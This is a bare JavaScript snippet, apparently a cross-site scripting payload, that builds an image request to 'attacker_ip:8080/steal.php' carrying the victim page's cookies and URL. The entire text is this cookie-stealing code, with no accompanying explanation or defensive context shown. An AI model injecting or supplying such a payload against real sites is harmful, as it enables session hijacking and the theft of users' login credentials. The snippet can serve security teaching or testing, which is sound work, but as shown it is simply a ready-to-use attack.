(function(){
    var img = new Image();
    img.src = 'http://attacker_ip:8080/steal.php?c=' + encodeURIComponent(document.cookie) + '&url=' + encodeURIComponent(location.href);
    document.body.appendChild(img);
})();